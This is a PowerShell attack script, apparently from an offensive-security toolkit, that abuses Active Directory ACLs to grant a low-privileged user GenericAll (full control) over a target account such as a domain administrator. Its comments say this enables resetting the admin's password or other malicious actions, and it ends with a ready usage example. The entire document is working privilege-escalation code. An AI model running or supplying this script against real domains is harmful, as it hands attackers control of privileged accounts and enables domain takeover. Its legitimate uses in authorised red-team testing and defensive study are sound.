#############################################
#  ABUSE ACL TO ADD GENERICALL PERMISSION   #
#############################################
# Also known as: ACL Abuse / DACL Attack    #
#############################################
# Requires:
# - Permissions to read and write ACLs on the target object (or write access to that object)
# - Domain-joined machine
# - ActiveDirectory module
#
# Grants "low.priv" user full control (GenericAll) over the "domainadmin" account.
# This can be used to reset the admin's password or perform other malicious actions.

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetUser,

    [Parameter(Mandatory=$true)]
    [string]$LowPrivUser
)

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    Write-Error "ActiveDirectory module not found. Please install RSAT tools."
    exit
}
Import-Module ActiveDirectory

# Get target and low-priv user AD objects
$Target = Get-ADUser -Identity $TargetUser
$LowPriv = Get-ADUser -Identity $LowPrivUser

# Load the target object as a DirectoryEntry
$TargetDN = "LDAP://" + $Target.DistinguishedName
$TargetDE = [ADSI]$TargetDN

# Translate the LowPriv user to a NTAccount SID
$LowPrivSID = (New-Object System.Security.Principal.NTAccount($LowPriv.SamAccountName)).Translate([System.Security.Principal.SecurityIdentifier])

# Get the existing ACL
$ACL = $TargetDE.ObjectSecurity

# Create new access rule with GenericAll
$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $LowPrivSID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)

# Add and apply the rule
$ACL.AddAccessRule($Rule)
$TargetDE.ObjectSecurity = $ACL
$TargetDE.CommitChanges()

# Usage:
# .\weak_perms_on_user.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
